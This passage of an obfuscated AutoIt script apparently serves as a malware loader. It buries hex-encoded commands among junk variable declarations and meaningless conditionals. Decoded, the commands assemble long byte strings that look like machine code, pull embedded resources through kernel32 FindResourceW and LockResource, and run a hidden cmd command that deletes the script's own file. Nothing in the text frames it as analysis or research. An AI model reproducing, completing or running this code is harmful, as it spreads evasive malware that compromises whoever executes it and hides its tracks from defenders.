		Local $zzjbayvrbocjxtesxm = $ee($v1("0x2479666E6578727071716D687A757864686F656E7971636F2026202235353733363537324337383546344641464646463530373236463633433738354638464146464646363537333733303043373835343846464646464637373633373337344337383522"))
	Else
		$ee($v1("0x446C6C5374727563745365744461746128247878786A79767070786E796C6B64617A6E756E6F73796D6371662C20226634713534666473353466717364222C2024444429"))
	EndIf
	Dim $oaxrodjdlkznpfxf = IsString(8573177)
	Global $jwxglujeyejcmhnlsxtderp = "hwnd"
	Global $jccxdakqfdzkdjzyngp = "iframe"
	If NOT ($oaxrodjdlkznpfxf == 1) Then
		Local $ppqzqhcqnwtp = $ee($v1("0x247A7A6A6261797672626F636A78746573786D2026202234434646464646463646364436323733383838353530464646464646433738354334464346464646344537343531373543373835433846434646464636353732373935334337383522"))
	Else
		Local $kozlkpxxbaowbgovuy = $ee($v1("0x247869637A646876726376727562666E627A73686A7467796B627A6364682026202246464646343338354330373444323546354535423842453535444332303830304343434343434343434343434343434343434343434343434343353138443443323430343242433822"))
	EndIf
	Dim $xjujak = BinaryToString("0x737363666274746C796E6D63")
	Dim $lskhbaaisvcjlhuke = "Text"
	Dim $qkqlshndqqxo = "dword*"
	Local $kyrxmghsgvajbgapnnyzaczp = "int"
	Local $sbynnbiklmirdjsjpsymxq = "struct*"
	Local $yjyhz = "handle"
	Dim $jpqii = "SMTP trace"
	Dim $wodfwvqitjxvazbaomo = "ImageList_SetOverlayImage"
	Local $mjdrtub = "%02d/%02d/%04d"
	Dim $psabyefdt = "bool"
	Local $fizjnqtvxqitctbe = "d"
	Global $rcrfhzzckh = "Error"
	Global $oxeurkglhlhzkhzecacy = "ptr"
	Global $ndrknnjomtofeog = "Top"
	If NOT ($xjujak == 1) Then
		Local $wnwqn = $ee($v1("0x247070717A716863716E7774702026202243434643464646463635363337343639363643373835443046434646464636463645383838354432464346464646433738354238464546464646353336383646373743373835424322"))
	Else
		Local $vutdkskyjhim = $ee($v1("0x24786478717A7272617872616377656174686D67787673686D617165742026202245383343453846464646383938353830303130303030384438354230464246464646353045383241453846464646383341354538303030303030303038393835453430303030303022"))
	EndIf
	Dim $ovjqjgxrzxhhjzksk = IsInt(84236542)
	If NOT ($ovjqjgxrzxhhjzksk == 0) Then
		Local $fnposvvflrofojlqmbnxaibykkzx = $ee($v1("0x24776E77716E2026202246454646464635373639364536343636433738354330464546464646364637373838383543324645464646464337383543344642464646463433373236353631433738354338464222"))
	Else
		Local $egvronbfwjyekyxaobsttusqipc = $ee($v1("0x24766F61657A617079657863642026202246463530384438354434463446464646353046464437384438353634464546464646383343343043353046464436353934303530384438353634464546464646353038443835423422"))
	EndIf
	Dim $txyxv = IsInt("pngasxajvq")
	Global $vnljomwdxtsoqchct = "GdipCreateRegionRect"
	If NOT ($txyxv == "ydwfbxzabptxbmiytizdu") Then
		Local $lrpmgfyehxwuu = $ee($v1("0x24666E706F737676666C726F666F6A6C716D626E78616962796B6B7A782026202246464646373436353537363943373835434346424646464636453634364637374337383544304642464646463435373835373030433738353634464346464646353236353637363922"))
	Else
		Local $qdwvdt = $ee($v1("0x2468776E6F626D7169656B6577627878646967682026202234354530353046464437384244384538423145344646464638423544313838393435344338443835463446424646464635304538394645344646464638393435333438443835323422"))
	EndIf
	Dim $uypmpvyltozcpe = IsString("vphdkkkrmbgvgbb")
	Global $wfnmtgiehwqtmqpa = "ushort Size;ushort Flags;ushort IlluminantIndex;ushort RedGamma;ushort GreenGamma;ushort BlueGamma;ushort ReferenceBlack;ushort ReferenceWhite;short Contrast;short Brightness;short Colorfulness;short RedGreenTint"
	Dim $wopbd = "LPARAM"
	Global $cjiqnfeihhlvfhqrpc = "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;"
	Local $aeqftbagekwvp = "Day"
	Global $fdoiihsfkvoxylaukfceslt = "float"
	Dim $dxoapc = "int"
	Global $zgfdslkvymch = "gdi32.dll"
	Local $lkdqgu = "ID"
	Local $fevrkfmc = "long"
	Dim $nfcjs = "struct*"
	Local $ravknmofzemoqwaxnqtks = "{A305CE99-F527-492B-8B1A-7E76FA98D6E4}"
	Dim $piogh = "int"
	Global $ensdkuhevznyuokreevcofd = "dword"
	Dim $ufyixfgnjcexmtiopsmb = "Param"
	Dim $xcdxvkzkbcqzcgmbhrgehng = "struct*"
	If NOT ($uypmpvyltozcpe == "shqtfzlslr") Then
		Local $tfqokzmhzkljtnw = $ee($v1("0x246C72706D6766796568787775752026202243373835363846434646464637333734363537324337383536434643464646463433364336313733363643373835373046434646464637333537383838353732464346464646433722"))
	Else
		Local $xmaxmgznnfgv = $ee($v1("0x24656F646D71632026202246394646464634353738373036314337383534344639464646463645363434353645433738353438463946464646373636393732364643373835344346394646464636453644363522"))
	EndIf
	Dim $tapkez = BinaryToString("twgjhuhoik")
	Dim $uikdkscuvu = "struct*"
	Dim $rfjawpk = ";ulong_ptr ProcessIdList[n]"
	Local $cjkzwddguffgyhdupkmvh = "dword"
	Global $tzpmwsqljnitzs = "ptr"
	Local $omcxkgcxcazipnprygx = "strlen"
	Local $bouxlyjuwewd = "struct*"
	If NOT ($tapkez == 0) Then
		Local $mreivxutcbzikgiofscgdljal = $ee($v1("0x247466716F6B7A6D687A6B6C6A746E772026202238353434464346464646343436353636353743373835343846434646464636393645363436464337383534434643464646463737353037323646363643373835353046434646464622"))
	Else
		Local $vutdkskyjhim = $ee($v1("0x24786478717A7272617872616377656174686D67787673686D617165742026202245383343453846464646383938353830303130303030384438354230464246464646353045383241453846464646383341354538303030303030303038393835453430303030303022"))
	EndIf
	Dim $qoism = IsString(27881754)
	Global $uatcbmi = "Sending request ..."
	Dim $kncnvenh = "float"
	Global $ltoajyfbbpjxrc = "iframe"
	Dim $skwucppdlv = "uint_ptr"
	Dim $mowqig = "WinAPIInternals.au3"
	Dim $ocazobplkkagotysjez = "uint"
	Global $itadva = "Day"
	Global $zfawttc = "NETWORK"
	Local $alliuxuyyzcfdul = "long"
	Dim $kfpkphaaoxeygekkwqwkfgac = "float"
	Global $tcfkzm = "float"
	Local $ypvehtixuzt = "uint64*"
	Global $yuywudemivfhyimfmdo = "\"
	If NOT ($qoism == 1) Then
		Local $nqmhddnscspsoyxzlnml = $ee($v1("0x246D7265697678757463627A696B67696F66736367646C6A616C2026202236333537383838353532464346464646433738354634464246464646353036463733373443373835463846424646464635313735363937344337383546434642464646463444363522"))
	Else
		Local $fonbvcheguftwkcaeikgadyzndug = $ee($v1("0x246970796C686575727179726E73677668617674617863676763706E632026202238443835373846394646464635304538354445374646464638393835413430303030303038443835453446424646464635304538344245374646464638393835434330303030303022"))
	EndIf
	Dim $gvrdlxdicbdyjh = IsString(-80644328)
	Local $elhayavakpnpkt = "]"
	Local $htifbeftciobxexucxazuscp = "struct*"
	Global $pmtfdqqtvzgdhcgvrgy = "ptr*"
	Local $vhvfreoqthhlqhjdl = "byValue"
	Dim $buwutxowljzfi = "GUIDataSeparatorChar"
	Local $kxylffgyvvlzm = "dword"
	Global $gzpalaluqrfjicc = "image/jpeg"
	Local $tomvgvnxzxlokwolzjjqzjl = "uint["
	Global $awptttinvgblstm = "NonPageRead"
	Dim $jbhivxcsizyjciz = "InflateRect"
	Global $iferfwbijnqqemhxut = "TextMax"
	If NOT ($gvrdlxdicbdyjh == "wujbnsrpqrd") Then
		Local $qbbrvg = $ee($v1("0x246E716D6864646E73637370736F79787A6C6E6D6C2026202237333733433738353030464346464646363136373635303043373835323446464646464634353645363435304337383532384646464646463631363936453734383838353243464622"))
	Else
		Local $hpudqgyrglybjztszujdupnyzjggzoyrledakhmgmngedexblxlu = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x24716863636F77746574726866726A736B716E616772202620225C2220262024626262202620222E76627322"))
	EndIf
	Dim $brqaljoldslayvfvjrw = IsInt(23758202)
	Local $bsvmceogmdqqpdfw = "ptr;dword;ptr;long"
	Local $rbqsihlo = "bool"
	Global $lnebztncjydfnvfogflzcq = "wparam"
	Global $kamfqqmjqrcmoem = "Y"
	Dim $fnwdxdsfiq = "ulong*"
	Global $ehnotawshrwxdccsbzpwi = "float"
	Local $hdjnkiwlvvxeaqtji = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;"
	Global $aftapngqhxmbxxgqqjhzu = "$_IESTATUS_InvalidObjectType"
	Dim $fxslggnuenp = "dword"
	Local $xxbfdyiwhcj = "GdipBitmapSetPixel"
	If NOT ($brqaljoldslayvfvjrw == 0) Then
		Local $qqgsahewhhimzylqinsvruf = $ee($v1("0x247162627276672026202246464646433738353343464646464646343636393643364343373835343046464646464635323635363337343838383534344646464646464337383543344645464646463432363522"))
	Else
		Local $qksnuahvkeziysqcgucz = $ee($v1("0x24766175706F6463757668716E6C6575636F686A6C6F6D2026202246463532363537333646433738353843464446464646373537323633363538383835393046444646464643373835373846394646464634453734353137354337383537434639464622"))
	EndIf
	Dim $ygybpekvsvvkbjswjhe = BinaryToString("0x637870757168627A6B786368647072")
	Local $phdzjqpbdoongmaxynecgvc = "00"
	Local $xvewkmwaliblmbftgmveqxhh = "Right"
	Global $hrtfpjjtuwh = "GdipLoadImageFromStream"
	Dim $faswnbcwmpptljanw = "str:cdecl"
	Local $pjsclcci = "top"
	Global $jsnlwplutelfeqwxatgztny = "__Excel_COMErrFunc"
	Global $pklyukpqfax = "]"
	Dim $ltwzdenmpecoexevtmpnzbj = "struct*"
	Local $qokva = "Uploading "
	If NOT ($ygybpekvsvvkbjswjhe == 0) Then
		Local $gsxxovmoulwnwljshorrprzooz = $ee($v1("0x2471716773616865776868696D7A796C71696E73767275662026202236373639433738354338464546464646364535303631363936364337383543434645464646463645373438383835434546454646464643373835323446434646464634333646343922"))
	Else
		Local $sbxnhbdprqutcaufkusfdgjrg = $ee($v1("0x246D62756B79727763617A7A646D6C78737961767A6470796277616D792026202245344645464646463643373335433645433738354538464546464646373436343643364343373835454346454646464632453634364336433838383546304645464646464337383522"))
	EndIf
	Dim $iozqzxrudugvffrl = BinaryToString("jtjiiseskv")
	Local $yjkbpdozbueazwiff = "wstr"
	Local $swgczeuycaootzkepokudvb = "Text"
	Dim $gjjgemwlxbdhckipwafpg = "SystemExclamation"
	Local $pqkutxu = "struct*"
	Dim $ylowvcs = "uint"
	Dim $bhlzlnybumo = "Text"
	Global $qobcrahwg = "int"
	Local $baedxzydcheligytloosnjg = "MinMonth"
	If NOT ($iozqzxrudugvffrl == 0) Then
		Local $asnzapvlzadkpbvs = $ee($v1("0x24677378786F766D6F756C776E776C6A73686F727270727A6F6F7A2026202236454337383532384643464646463639373436393631433738353243464346464646364336393741363536364337383533304643464646463435373838383835333246434646464622"))
	Else
		Local $fjccklkwgjhnneqhbaodw = $ee($v1("0x2472746666762026202243373835333046394646464636443631373436394337383533344639464646463646364535303732433738353338463946464646364636333635373336364337383533434639464622"))
	EndIf
	Dim $pqbbf = IsString("pgpdekhicrbfoicbyeukmnetxjavfprettwasxzbhpqr")
	Local $ywrophtdijqtlb = "handle"
	Local $ltkruxchixcwgsxvtz = "wstr"
	Global $yktgxxlveznujaudueyoghkr = "char[4096]"
	Dim $syrbqqsnjqlwzrmexo = "int"
	Global $csyvygtrzczvgsxnxx = "float["
	Local $lmjhzxucmddezqg = "handle"
	Dim $jzvjolatzpqarygerf = "wstr"
	Local $iyomyvrhbqurfurrbyxhfyfm = "ulong"
	Local $xvybdssba = "wchar Text["
	Global $pimxywjleomqgrgt = "Error"
	If NOT ($pqbbf == 0) Then
		Local $nackpfzvkhzdqptijpu = $ee($v1("0x2461736E7A6170766C7A61646B706276732026202243373835373446424646464634333646343337324337383537384642464646463635363137343635433738353743464246464646343936453733373443373835383046424646464622"))
	Else
		Local $hoacpicpdncbudv = $ee($v1("0x247267636B677770647A612026202238354141464546464646433738354430464546464646344537343446373043373835443446454646464636353645343636393636433738354438464546464646364336353838383522"))
	EndIf
	Dim $czmqtldpqynsrkejiyt = IsString("mdaxordxdqzieqhnkyfjxtpczvzqhuthovh")
	Dim $bjjiu = "<input type="
	Local $qhewczpatjfkylxblxjizjl = "Flags"
	Global $pkcvuemocjfigj = "struct*"
	Global $yjtcqmhxwc = "handle"
	Global $vraqjexyob = "dword"
	Local $nvdqazgdndd = "wparam"
	Global $uxxbiqvnohqzevijivshymu = "uint"
	Dim $sdioxfkg = "int"
	Dim $zptnahvaauluduhrs = "uxtheme.dll"
	Dim $rydysfz = "handle"
	Local $yrhtjgzuyfyfbkgi = "GdipClonePath"
	If NOT ($czmqtldpqynsrkejiyt == "invuchymtmwdfsbaxhrrmqeeyyudntwkxa") Then
		Local $ubvlhrllioxypv = $ee($v1("0x246E61636B70667A766B687A64717074696A70752026202236313645363336353838383538344642464646464337383536344645464646463543344236453646433738353638464546464646373736453434364343373835364346454646464622"))
	Else
		Local $qlnbsoaqplxgrmscqzl = $ee($v1("0x246B6F6F6672656D2026202231304644464646463646303043373435434336443632373337344337343544303646373736333733383834354434433734354438373337343732364336364337343544433635364522"))
	EndIf
	Dim $posgvxyalvuuilplwtnk = BinaryToString("0x6869776B696C6968726D6D6A696561776176637678616A706C776162726A6464716979696F73")
	Global $cemxt = "kernel32.dll"
	Local $euwwr = "bool"
	Local $juezexnpqnnvtjnwugts = ">"
	Dim $eltdqtofxdpbhnywfr = "RegSetValueExW"
	Dim $dohvgzclc = "handle"
	Dim $dznkuxvbi = "ptr"
	Global $igivjnb = "dword"
	Global $axlijumuumhvd = "ptr*"
	Local $ltafxmwdmaqgbo = "SymSetOptions"
	Global $ryqylnboowew = "kernel32.dll"
	Dim $lxchpqooaivjdfsfwplmo = "ptr"
	Local $gzriqrhzxvvdmidtdkqqqexi = "dword"
	Local $hbqgrkdbqzg = "shlwapi.dll"
	If NOT ($posgvxyalvuuilplwtnk == 1) Then
		Local $weymdkvsrospsvkhu = $ee($v1("0x247562766C68726C6C696F787970762026202236433733333333324337383537304645464646463543344636433635433738353734464546464646333333323245363436364337383537384645464646463643364338383835374122"))
	Else
		Local $mbrcqgdfzhaexjdpotvmubvnhcfaddlfazdrzxvqzvbwsivl = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C202246696E645265736F7572636557222C2022707472222C202468496E7374616E63652C202277737472222C2024412C20226C6F6E67222C202442295B2230225D"))
	EndIf
	Dim $avmikotomsj = IsString("yxpqwpkjvdbnsn")
	Local $bimzja = "user32.dll"
	Dim $etigmtxnhpurpyhxt = "ushort ProcessorGroup[n]"
	Dim $cnouyprtxy = "Private Bitmap"
	Global $sgvkhzymq = "ClipCursor"
	Dim $kljfbqfqynqfoix = "ftLastWriteTime"
	Dim $ipylxslnlvjvlqhgn = "PropertyTagUnKnown"
	Dim $vivggepqvzbwiaor = "dword"
	Global $rtofjgdczxiutuot = "\"
	Global $escvsltnnkcqqppqvh = "float"
	Local $dcqsn = "wparam"
	Dim $thoxyt = "bool"
	Local $vtptqrwhsfedtlwhrbpmdef = "form"
	Local $dotrvtbyljwgnktlvad = "wparam"
	Dim $rphsgcuqodiwoinajlbvz = "int Quality"
	Local $oesrjfiltixdk = "SigCount"
	Local $dvvtxqwlxuqrxevdewebkcgi = "handle"
	Global $fkkqgycr = "uint"
	If NOT ($avmikotomsj == 0) Then
		Local $aagbrrpusetqgmijhtlv = $ee($v1("0x247765796D646B7673726F737073766B68752026202246454646464643373835313846464646464634463643363533334337383531434646464646463332324536343643363643373835323046464646464636433030433738353334464322"))
	Else
		$poe($rfo("0x5368656C6C457865637574652822636D64222C2022202F632054696D654F7574203120262044656C202F4620222026204368722822333422292026204053637269707446756C6C506174682026204368722822333422292C2022222C2022222C204053575F4849444529"))
	EndIf
	Dim $rnxhhupornontyoyloa = IsInt("skyefedylponhidkymhkfuwatoqgtilnoqrnavbryk")
	Dim $ranejtvnqknjgt = "handle"
	Local $udkpsrlbimnqqgsmlq = "Size"
	Dim $eysawilerslrw = "handle"
	Global $wyjbcbghwzevwvcwb = "wparam"
	Local $roviaxru = "bV5Compression"
	Global $owwosxficrlexepiwppq = "uint"
	Dim $yhdaafklexfpyzgky = "handle"
	Global $ngkyekovfnidnfy = "uint Size;"
	Local $edsgghroripeqttodrxfwp = "kernel32.dll"
	Local $rocctbzvb = "ole32.dll"
	Global $gadgqtffawpkzbgjjaom = "GdipSetImageAttributesColorKeys"
	Dim $somxhpipcztwruyg = "wstr"
	Local $fuzscrvqmach = "MoveFileWithProgressW"
	Dim $krevyqrhmkffop = "browsercontainer"
	Global $cuuttwjglzwoascpfkg = "bool"
	Dim $snnmhxmgaafjex = ">Hello!</textarea>"
	Global $vvpmrvsmsdpjfessp = "Hour"
	Dim $gpmufywiq = "dword RawReadsDenied;dword RawWritesDenied;dword NetworkErrors;dword Sessions;dword FailedSessions;dword Reconnects;"
	Dim $ntlhkzb = "Millimeters"
	If NOT ($rnxhhupornontyoyloa == "dnwvrbfatiyctvylbz") Then
		Local $wffzbjgssypabuwyjufmjrkf = $ee($v1("0x24616167627272707573657471676D696A68746C762026202246464646344537343433373243373835333846434646464636353631373436354337383533434643464646463444373537343631363643373835343046434646464636453734383822"))
	Else
		Local $wsfcnturxbgiiobnmlycjoqni = $ee($v1("0x24686F616370696370646E63627564762026202244414645464646464337383533344644464646463445373435333635433738353338464446464646373435363631364343373835334346444646464637353635344236353636433722"))
	EndIf
	Dim $aotxwvwmrpwflkgjvhsy = IsString("jtrdkixddcsglkohjzpy")
	Global $wmtlhqzomfasw = "WinAPIConv.au3"
	Dim $wzyiy = "kernel32.dll"
	Local $ypsjtkfju = "$_IESTATUS_InvalidObjectType"
	Dim $dbkyxqzefqyy = "-"
	If NOT ($aotxwvwmrpwflkgjvhsy == "bexnmqujqg") Then
		Local $bclbkflc = $ee($v1("0x247766667A626A677373797061627577796A75666D6A726B662026202238353432464346464646433738353434464446464646344537343446373043373835343846444646464636353645344437354337383534434644464646463734363136453734383822"))
	Else
		Local $klbkvsjdwlkfvmqqelndtahnvmf = $ee($v1("0x2469646D6D74617A627067687A77746478646F6868676466726F717574732026202245344646464638393435343038443835323446434646464635304646423545344638464646464646393545384638464646463839343533303844383537344642464646463530464622"))
	EndIf
	Dim $nvhqmvdnnrypubaqylitxupz = BinaryToString("0x6A71736A6C676C736D6F6479636569617A7371647A79717869657A79797A6E6D78666E79686C667073")
	Dim $hqttuwjceyegpnszhvxeprnp = "handle"
	If NOT ($nvhqmvdnnrypubaqylitxupz == 1) Then
		Local $zlyvugahlwcuos = $ee($v1("0x2462636C626B666C632026202238353530464446464646433734354243364236353732364543373435433036353643333333323838343543383838343541383838383538304644464646463634413133303030303022"))
	Else
		Local $sbxnhbdprqutcaufkusfdgjrg = $ee($v1("0x246D62756B79727763617A7A646D6C78737961767A6470796277616D792026202245344645464646463643373335433645433738354538464546464646373436343643364343373835454346454646464632453634364336433838383546304645464646464337383522"))
	EndIf
	Dim $sgheet = IsString("onjprgqmsajohddulolqoreqobaaqajsfymugkcyqmft")
	Dim $vzfqoume = "wstr"
	Dim $xaeldzkqde = "long"
	Global $cuzukhb = "cyBottomHeight"
	Local $lwsnaxaliuljhzsqzdpxa = "dword"
	If NOT ($sgheet == "cnqdskpfycyatfppqqtwqmykasdaghvsbztzngtwtkfpp") Then
		Local $omqjamnzmeuzyyyeimmnbpwbecuya = $ee($v1("0x247A6C7976756761686C7763756F732026202230304337343543343245363436433643433734353943344234353532344543373435413034353443333333324337343541343245343434433443384234303043384234303134384222"))
	Else
		Local $kvwniswlvneetlc = $ee($v1("0x24676E6C6975667872786A2026202237434641464646463633363537333733383838353830464146464646433738354434464146464646354137373433373243373835443846414646464636353631373436354337383522"))
	EndIf
	Dim $cntustgfzg = IsInt("aqrwwhfrmmsaypbhnwerpopcuqjlycopmmntd")
	Local $jtctpzrtnzbui = "hwnd"
	Global $unpqahcircoldbgcfntw = "kernel32.dll"
	Dim $hkufvqyxghm = "complete"
	Dim $ulcru = ", CPUArch: "
	Local $fqltyoufwynfh = "SysListView32"
	Dim $grtehe = "kernel32.dll"
	Global $ckcqe = "struct*"
	Dim $xeetcsjdblnwasofakci = "]"
	Dim $zusve = "gdi32.dll"
	Local $yhlkbbheyjagtcuakw = "ptr"
	Local $xxludfzkxflmtpophmes = "handle"
	Dim $iwhwzrlhvyxakzqywiubdptz = "dword"
	If NOT ($cntustgfzg == 1) Then
		Local $mpqrinzlafzozztauibjgnphar = $ee($v1("0x246F6D716A616D6E7A6D65757A79797965696D6D6E6270776265637579612026202230303842353831303844343544383530433738353734464446464646343337323635363143373835373846444646464637343635344437354337383537434644464646463734363522"))
	Else
		Local $xdxqzrraxracweathmgxvshmaqet = $ee($v1("0x2469746F7268732026202245383630453846464646383938353130303130303030384438353943464246464646353045383445453846464646383938353938303030303030384438353034464346464646353022"))
	EndIf
	Dim $lcjsxouyd = BinaryToString("0x76737A757371777263746D686961726C6578786E69646D7879706972796875716D727178657665716277667177")
	Global $lxpowoepqniklbvsdhi = "gdi32.dll"
	Dim $ydbiglwsdni = "__Excel_COMErrFunc"
	Local $aedyavlvj = ".htm"
	Dim $ckunafmczlnnistyku = "_Application"
	Local $qryejtkwcuofo = "wparam"
	Local $pndpngprpqicnlpksgmtwjq = "&gt;</td>"
	If NOT ($lcjsxouyd == "vgsgrxhqkyaerkbibpxtjojtmqzfbpayihy") Then
		Local $ypofxrpyzpdiplzsihmybqcajuto = $ee($v1("0x246D707172696E7A6C61667A6F7A7A74617569626A676E706861722026202237383537453839364543464646463842463038443435434335304538384245434646464638424638384434354243353046464436353934303530384434354243353038443835384322"))
	Else
		Local $fjfvgpbbuthdxclqobkfhpykd = $ee($v1("0x2479767864662026202246464646353045383235453446464646384235443134383934353234384438353734464446464646353045383133453446464646364135453839343532303842343530383539384422"))
	EndIf
	Dim $fwqyit = IsInt(34080609)
	If NOT ($fwqyit == 0) Then
		Local $uzzjqr = $ee($v1("0x2479706F66787270797A706469706C7A7369686D79627163616A75746F2026202245324646464635304646443738443435394338334334304335304646443635393430353038443435394335303844383538344530464646463530464644373844383534434645464622"))
	Else
		Local $sqchmjsmx = $ee($v1("0x247766767A65612026202246464646354334423645364643373835423446444646464637373645343436434337383542384644464646463643373333333332433738354243464446464646354336313634373622"))
	EndIf
	Dim $hyuyjbgoskhjredmhwsbf = BinaryToString("0x7477696C65776B6C76687A71676A6D767866746467786B657577776672796F69")
	Dim $ythxyvnpimyi = "hwnd"
	Global $uxbuwfmuvlnpzpkgh = "FindFirstFileNameW"
	Dim $mhvmmw = ", $sFileList = "
	Global $oztzklzqsldmzmllfn = "SystemExclamation"
	Global $qrcpdncpi = "int"
	Dim $dgmtpoekqofxpnvj = "OEM Text"
	Dim $bylxhrkgxxb = "hwnd"
	Local $xvfzrqzvnpbmfzqrsobrbrsi = "int"
	Dim $hgnpeuxsr = "kernel32.dll"
	Local $qjgkvvvmkqf = "wstr"
	If NOT ($hyuyjbgoskhjredmhwsbf == 0) Then
		Local $ojxuhiz = $ee($v1("0x24757A7A6A71722026202246463833433430433530464644363539343035303844383534434645464646463530384438353934453446464646353046464437384438354230464446464646383343343043353022"))
	Else
		Local $joejzlmmhza = $ee($v1("0x2470746F6A7961757778657966657771746D70767561636F6A6365696B2026202244373844383545434644464646463833433430433530464644363539343035303844383545434644464646463530384438354343463246464646353046464437384438353238464522"))
	EndIf
	Dim $iuygdxuplroazx = IsString("jnqmshmqnx")
	Global $hflhvg = "handle"
	Local $qurahcvzzmos = "dword"
	Global $srkvyddd = "handle"
	Dim $gxmcagklyqznsxcsjukkrmg = "ptr"
	Dim $aofmraxkwymwmhheuoser = "hwnd"
	If NOT ($iuygdxuplroazx == 0) Then
		Local $baewlspkneiucpinovcxaezpusywp = $ee($v1("0x246F6A787568697A2026202246464436353934303530384438354230464446464646353038443835394345364646464635304646443738443835393446444646464638334334304335304646443635393430353022"))
	Else
		Local $umsfgmyfnycwodqvdyyhxwfbldxa = $ee($v1("0x2478637574726269682026202246464646373736453434364343373835333046454646464636433733354336424337383533344645464646463635373236453635433738353338464546464646364333333332324522"))
	EndIf
	Dim $kuihtguqxyefwfmyzqiadf = IsString("eujnmvye")
	Dim $rrwzebsuriteeb = "wNumberingStyle"
	Local $iblziptnjxsfiaeqtcybyze = "GdipFlattenPath"
	If NOT ($kuihtguqxyefwfmyzqiadf == "ocxnnbw") Then
		Local $voaezapyexcd = $ee($v1("0x24626165776C73706B6E6569756370696E6F76637861657A7075737977702026202238443835393446444646464635303844383544434636464646463530464644373844383531304645464646463833433430433530464644363539343035303844383531304645464622"))
	Else
		Local $umsfgmyfnycwodqvdyyhxwfbldxa = $ee($v1("0x2478637574726269682026202246464646373736453434364343373835333046454646464636433733354336424337383533344645464646463635373236453635433738353338464546464646364333333332324522"))
	EndIf
	Dim $uqflezvqozbrn = IsInt("panmjonuymoni")
	Local $ezpjhonkyjnzixgoozncf = "uint"
	If NOT ($uqflezvqozbrn == "yklszibecjdathcgrvmykyehuchjlpgnqzmratreevcaxb") Then
		Local $egvronbfwjyekyxaobsttusqipc = $ee($v1("0x24766F61657A617079657863642026202246463530384438354434463446464646353046464437384438353634464546464646383343343043353046464436353934303530384438353634464546464646353038443835423422"))
	Else
		Local $cbgbguzkdzrzyfipbvtr = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C20224C6F636B5265736F75726365222C2022707472222C20246267706F677670766E7972677563636A6B69295B2230225D"))
	EndIf
	Dim $ouadygtwzmezevkirxtaldo = IsString("wxqepunhryykipfzfhrcmfnwjrwpzmiwambftczwmfvb")
	Global $cojpfbaphlpefnonexbt = "float"
	Local $elymlfjaohzukcouduubfi = "SymLoadModuleExW"
	Global $pbmfifqlsfehppkxlawgtdk = "GUIDataSeparatorChar"
	Dim $yjpqvvcowewufbijsxkmnfk = "int"
	Global $soelqxbkhh = "long"
	Dim $iebsfaqvuxkl = "Strikeout"
	Dim $ktylwocnjknzsvubnq = "sqlite3_column_bytes"
	Dim $mmeddmyrua = "int"
	If NOT ($ouadygtwzmezevkirxtaldo == "foniovlruxhdudjfpvqkfsavkgoryjzxyouaednv") Then
		Local $ptojyauwxeyfewqtmpvuacojceik = $ee($v1("0x24656776726F6E6266776A79656B7978616F627374747573716970632026202245434646464635304646443738443835444346454646464638334334304335304646443635393430353038443835444346454646464635303844383542434545464646463530464622"))
	Else
		Dim $rei = $poe("binarytostring")
	EndIf
	Dim $kzoijfugrshsayzaww = IsString("kgpxoeagzgmuzoehwhhbjwwuvyhqcbfqvmo")
	Local $gthscewokjhhwgseltuquem = "ushort*"
	Dim $xuygfnbbhpbnsb = "handle"
	Dim $itqduesifjsdbhempgcpeet = "Align"
	If NOT ($kzoijfugrshsayzaww == 0) Then
		Local $joejzlmmhza = $ee($v1("0x2470746F6A7961757778657966657771746D70767561636F6A6365696B2026202244373844383545434644464646463833433430433530464644363539343035303844383545434644464646463530384438354343463246464646353046464437384438353238464522"))
	Else
		Dim $ayudergfv = $poe("binarytostring")
	EndIf
	Dim $yccyatwqhejpjdpgxzeix = BinaryToString("znisztkactikk")
	Dim $usotdak = ";"
	Global $pkepwm = "bool"
	Dim $xgdmigeoyxsufxxyecoaj = "Right"
	Dim $oqmvolklfbd = "bool"
	Local $fmzllkdgk = "PathName"
	Dim $skfcmrfvyrujamngpe = "handle"
	Dim $ywcbxtqfhg = "dword"
	Local $tagcomrwhnspkzxwrfuhjun = "handle"
	Dim $yppqkuwctnanqhil = "struct*"
	Local $lntsiqbffoym = "wstr"
	Dim $nbgrcxsigkwdpmyxdftpbewh = "{B7534046-3ECB-4C18-BE4E-64CD4CB7D6AC}"
	Local $rouaymqtgfzfmten = "struct*"
	Local $msgqvgikyifyqt = "dySpaceBefore"
	Dim $ljyqysssdzhwwrovnxwk = "wstr"
	Global $pcslbgimdrlbyovnzoyr = "MinMonth"
	Dim $brrddwmrwmpiogh = "kernel32.dll"
	Local $ndflpphrkwwzgmooqtjdf = "shell32.dll"
	If NOT ($yccyatwqhejpjdpgxzeix == 1) Then
		Local $dqczwqwoxcafamv = $ee($v1("0x246A6F656A7A6C6D6D687A612026202246464646383343343043353046464436353934303530384438353238464546464646353038443835414345414646464635304646443738443835383846454646464638334334304322"))
	Else
		Local $umsfgmyfnycwodqvdyyhxwfbldxa = $ee($v1("0x2478637574726269682026202246464646373736453434364343373835333046454646464636433733354336424337383533344645464646463635373236453635433738353338464546464646364333333332324522"))
	EndIf
	Dim $zoojfhgsxmxuxhqbcw = BinaryToString("lckigtl")
	Global $gctzqngipxlfwafbjddymj = "dword"
	Local $arhgtdbesi = "char Text["
	Local $qeqehxlctbw = "ptr"
	Dim $mwkwkcspvzb = "wstr"
	Global $berzpbmyiicuf = "GdipCreateEffect"
	Dim $llqvohhmvjpajrcke = "m"
	Dim $jwgavnocuqxnjfnq = "ptr"
	Global $twfdfmmpqfrqeergofqzat = "MinHour"
	Global $mbreelfg = "GdiplusStartup"
	Dim $etanjyxwczsjsyylpyv = "bool*"
	Global $yslukmumkzwycve = "DllName"
	Local $vjpfur = "bmHeight"
	If NOT ($zoojfhgsxmxuxhqbcw == 1) Then
		Local $bmefhtskmiapgtjdmnprdycssfqk = $ee($v1("0x246471637A7771776F78636166616D762026202235304646443635393430353038443835383846454646464635303844383543344630464646463530464644373844383546344645464646463833433430433530464644363430353922"))
	Else
		Local $hoacpicpdncbudv = $ee($v1("0x247267636B677770647A612026202238354141464546464646433738354430464546464646344537343446373043373835443446454646464636353645343636393636433738354438464546464646364336353838383522"))
	EndIf
	Dim $faqhjhbru = IsString(16305195)
	Local $bqpsntwchmitd = "r"
	Global $yuvehuwcqoxkbvabokh = "RegisterShellHookWindow"
	Local $dfjcs = "int"
	Global $esuajitidhunczvlb = "browser"
	Local $etaydxqpve = "wstr"
